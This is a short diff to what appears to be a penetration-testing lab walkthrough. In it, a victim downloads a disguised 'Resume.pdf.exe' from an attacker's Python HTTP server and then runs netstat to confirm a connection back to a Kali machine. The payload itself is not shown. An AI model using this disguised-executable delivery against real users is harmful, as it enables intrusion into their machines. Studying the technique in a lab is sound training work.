@@ -107,3 +107,14 @@ python3 -m http.server 9999
 - Open web browser type in "<Attacker_IP_address>:9999"
 - We will see "Resume.pdf.exe"
 - Click and download it
+- Open Command Promt as administrator and type in..
+
+```console
+netstat -anob
+```
+- We want to see if an established connection to Kali machine is there, scroll up and you can see it
+
+
+
+
+
